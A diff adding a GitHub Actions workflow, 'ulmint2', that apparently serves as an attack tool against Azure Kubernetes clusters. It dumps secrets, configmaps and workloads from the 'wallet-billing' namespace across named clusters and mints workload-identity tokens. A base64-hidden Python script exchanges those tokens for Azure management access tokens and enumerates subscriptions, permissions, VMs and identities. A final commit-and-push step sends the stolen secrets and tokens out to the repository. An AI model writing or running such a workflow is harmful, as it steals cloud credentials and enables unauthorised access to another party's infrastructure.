@@ -1,0 +1,45 @@
+name: ulmint2
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+  id-token: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: m
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          echo 'aW1wb3J0IG9zLGpzb24sdXJsbGliLnJlcXVlc3QsdXJsbGliLnBhcnNlLGJhc2U2NCxzeXMKY2lkPW9zLmVudmlyb24uZ2V0KCdDSUQnLCcnKS5zdHJpcCgpOyBhPW9zLmVudmlyb24uZ2V0KCdBU1NFUlRJT04nLCcnKS5zdHJpcCgpCnRpZD0nNjI5NzRkOTctMTNiNi00MGM5LTg1NzYtZjFhYjI5MDViNmNmJwpwcmludCgnY2lkJyxjaWQsJ2FsZW4nLGxlbihhKSkKZGVmIHBvc3QodSxkKToKICAgIHI9dXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1LGRhdGE9dXJsbGliLnBhcnNlLnVybGVuY29kZShkKS5lbmNvZGUoKSxoZWFkZXJzPXsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJ30pCiAgICB0cnk6IHJldHVybiB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHIsdGltZW91dD00MCkucmVhZCgpLmRlY29kZSgpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgdHJ5OiByZXR1cm4gJ0hUVFBFUlIgJytzdHIoZSkrJyAnK2UucmVhZCgpLmRlY29kZSgpWzo0MDBdCiAgICAgICAgZXhjZXB0OiByZXR1cm4gJ0VSUiAnK3N0cihlKQpkZWYgZ2V0KHUsdCk6CiAgICByPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodSxoZWFkZXJzPXsnQXV0aG9yaXphdGlvbic6J0JlYXJlciAnK3R9KQogICAgdHJ5OiByZXR1cm4gdXJsbGliLnJlcXVlc3QudXJsb3BlbihyLHRpbWVvdXQ9NDApLnJlYWQoKS5kZWNvZGUoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHRyeTogcmV0dXJuICdIVFRQRVJSICcrc3RyKGdldGF0dHIoZSwnY29kZScsJycpKSsnICcrZS5yZWFkKCkuZGVjb2RlKClbOjMwMF0KICAgICAgICBleGNlcHQ6IHJldHVybiAnRVJSICcrc3RyKGUpCmZvciB2ZXIsc2NvcGUgaW4gWygndjIuMCcsJ2h0dHBzOi8vbWFuYWdlbWVudC5henVyZS5jb20vLmRlZmF1bHQnKSwoJ3YxJywnaHR0cHM6Ly9tYW5hZ2VtZW50LmF6dXJlLmNvbS8nKV06CiAgICBiPXBvc3QoJ2h0dHBzOi8vbG9naW4ubWljcm9zb2Z0b25saW5lLmNvbS8lcy9vYXV0aDIvJXMvdG9rZW4nJSh0aWQsdmVyKSx7J2NsaWVudF9pZCc6Y2lkLCdjbGllbnRfYXNzZXJ0aW9uX3R5cGUnOid1cm46aWV0ZjpwYXJhbXM6b2F1dGg6Y2xpZW50LWFzc2VydGlvbi10eXBlOmp3dC1iZWFyZXInLCdjbGllbnRfYXNzZXJ0aW9uJzphLCdzY29wZSc6c2NvcGUsJ2dyYW50X3R5cGUnOidjbGllbnRfY3JlZGVudGlhbHMnfSkKICAgIHByaW50KCdBQUQnLHZlcixiWzozMDBdLnJlcGxhY2UoJ1xuJywnICcpKQogICAgaWYgJyJhY2Nlc3NfdG9rZW4iJyBpbiBiOgogICAgICAgIHQ9anNvbi5sb2FkcyhiKVsnYWNjZXNzX3Rva2VuJ10KICAgICAgICBwPXQuc3BsaXQoJy4nKVsxXTsgcCs9Jz0nKigtbGVuKHApJTQpCiAgICAgICAgYz1qc29uLmxvYWRzKGJhc2U2NC51cmxzYWZlX2I2NGRlY29kZShwKSkKICAgICAgICBwcmludCgnVE9LIG9pZCcsYy5nZXQoJ29pZCcpLCdhcHBpZCcsYy5nZXQoJ2FwcGlkJyksJ21pcmlkJyxzdHIoYy5nZXQoJ3htc19taXJpZCcpKVs6MTQwXSkKICAgICAgICBvcGVuKCd1bC9taW50L3Rva18lcy50eHQnJWNpZFs6OF0sJ3cnKS53cml0ZSh0KQogICAgICAgIHByaW50KCdTVUJTJyxnZXQoJ2h0dHBzOi8vbWFuYWdlbWVudC5henVyZS5jb20vc3Vic2NyaXB0aW9ucz9hcGktdmVyc2lvbj0yMDIyLTEyLTAxJyx0KVs6NzAwXS5yZXBsYWNlKCdcbicsJyAnKSkKICAgICAgICBvcGVuKCd1bC9taW50L3N1YnNfJXMuanNvbiclY2lkWzo4XSwndycpLndyaXRlKGdldCgnaHR0cHM6Ly9tYW5hZ2VtZW50LmF6dXJlLmNvbS9zdWJzY3JpcHRpb25zP2FwaS12ZXJzaW9uPTIwMjItMTItMDEnLHQpKQogICAgICAgIFM9JzFmOTkzNDdlLTM2YzgtNDUxMi1hZDMwLWY2MzhhOGQ4NDg5ZicKICAgICAgICBmb3IgdSBpbiBbJ2h0dHBzOi8vbWFuYWdlbWVudC5henVyZS5jb20vc3Vic2NyaXB0aW9ucy8lcy9wcm92aWRlcnMvTWljcm9zb2Z0LkF1dGhvcml6YXRpb24vcGVybWlzc2lvbnM/YXBpLXZlcnNpb249MjAyMi0wNC0wMSclUywnaHR0cHM6Ly9tYW5hZ2VtZW50LmF6dXJlLmNvbS9zdWJzY3JpcHRpb25zLyVzL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXM/YXBpLXZlcnNpb249MjAyNC0wNy0wMSclUywnaHR0cHM6Ly9tYW5hZ2VtZW50LmF6dXJlLmNvbS9zdWJzY3JpcHRpb25zLyVzL3Byb3ZpZGVycy9NaWNyb3NvZnQuTWFuYWdlZElkZW50aXR5L3VzZXJBc3NpZ25lZElkZW50aXRpZXM/YXBpLXZlcnNpb249MjAyNC0xMS0zMCclUywnaHR0cHM6Ly9tYW5hZ2VtZW50LmF6dXJlLmNvbS9zdWJzY3JpcHRpb25zLyVzL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS9sb2NhdGlvbnMvZWFzdHVzL3VzYWdlcz9hcGktdmVyc2lvbj0yMDI0LTA3LTAxJyVTXToKICAgICAgICAgICAgcHJpbnQoJ1BST0JFJyx1LnNwbGl0KCcvcHJvdmlkZXJzLycpWzFdWzo2MF0sZ2V0KHUsdClbOjMwMF0ucmVwbGFjZSgnXG4nLCcgJykpCiAgICAgICAgYnJlYWsK' | base64 -d > /tmp/mint.py; wc -c /tmp/mint.py
+          K=ul/kc/all-datapath.yaml
+          KX="/tmp/kubectl --kubeconfig $K --request-timeout=20s"
+          mkdir -p ul/mint
+          for C in aks-g42us-tfdemo-kashif-datapath-eastus aks-g42us-tfdemo-kashif-datapath-swedencentral aks-g42us-tfdemo-staging-datapath-swedencentral aks-g42us-tfdemo-kashif-portal; do
+            echo "=== CTX $C"
+            $KX --context $C get secret -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,T:.type --no-headers 2>/dev/null | grep -Ev 'helm|default-token|kube-root' | head -40
+            $KX --context $C get secret -n wallet-billing -o yaml > ul/mint/sec_$C.yaml 2>/dev/null
+            $KX --context $C get cm -n wallet-billing -o yaml > ul/mint/cm_$C.yaml 2>/dev/null
+            $KX --context $C get deploy,sts,ds -n wallet-billing -o yaml > ul/mint/wl_$C.yaml 2>/dev/null
+          done
+          for C in aks-g42us-tfdemo-kashif-datapath-eastus aks-g42us-tfdemo-kashif-datapath-swedencentral aks-g42us-tfdemo-staging-datapath-swedencentral; do
+            echo "=== MINT $C"
+            A=$($KX --context $C create token control-sync-apply -n wallet-billing --audience api://AzureADTokenExchange --duration 3600s 2>/dev/null)
+            echo "assert_len=${#A}"
+            if [ ${#A} -gt 100 ]; then
+              CID=$($KX --context $C get sa control-sync-apply -n wallet-billing -o jsonpath='{.metadata.annotations.azure\.workload\.identity/client-id}' 2>/dev/null)
+              echo "cid=$CID"
+              CID="$CID" ASSERTION="$A" python3 /tmp/mint.py 2>&1 | tee ul/mint/res_$C.txt
+            fi
+          done
+          echo "=== DONE"
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulmint2 $(date -u +%s)"
+          git push
